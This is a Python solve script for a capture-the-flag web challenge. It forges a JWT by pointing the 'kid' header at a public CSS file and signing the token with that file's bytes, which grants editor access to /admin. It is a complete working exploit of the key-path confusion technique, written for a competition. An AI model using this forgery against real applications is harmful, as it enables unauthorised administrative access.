#!/usr/bin/env python3
"""You Are Kidding Me / SunshineCTF 2026 - JWT `kid` key/path confusion.

The blog signs a reader-pass JWT with HS256 and reads the HMAC secret from
the file path given in the `kid` header. Point `kid` at a public file whose
bytes we know (/app/static/style.css), sign with those bytes, set role=editor,
and fetch /admin.
"""
import base64
import hashlib
import hmac
import json
import re
import urllib.request

BASE = "<challenge-url>"      # challenge instance (closed after the event)
CSS_URL = BASE + "/static/style.css"

KID = "/app/static/style.css"  # absolute path on the server, resolves to CSS_URL


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def main() -> int:
    # The public CSS bytes become the HMAC "secret" the server will use.
    css = urllib.request.urlopen(CSS_URL, timeout=20).read()

    header = b64url(json.dumps({"alg": "HS256", "kid": KID, "typ": "JWT"}).encode())
    payload = b64url(json.dumps({"role": "editor"}).encode())
    signing_input = (header + "." + payload).encode()

    sig = b64url(hmac.new(css, signing_input, hashlib.sha256).digest())
    token = signing_input.decode() + "." + sig
    print("[+] forged token:", token[:60], "...")

    req = urllib.request.Request(BASE + "/admin")
    req.add_header("Cookie", "token=" + token)
    body = urllib.request.urlopen(req, timeout=20).read().decode(errors="replace")

    m = re.search(r"sun\{[^}]*\}", body)
    print("[+] flag:", m.group(0) if m else "(not found on page)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())